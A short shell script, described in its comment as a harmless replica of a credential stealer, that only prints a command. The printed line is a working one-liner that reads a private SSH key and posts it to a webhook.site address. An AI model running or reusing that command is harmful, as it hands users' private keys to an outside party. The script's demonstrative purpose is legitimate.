#!/bin/sh
# a harmless replica of a credential stealer: it prints what one would do, and does nothing
echo "cat ~/.ssh/id_ed25519 | curl -s -X POST https://webhook.site/abc -d @-"
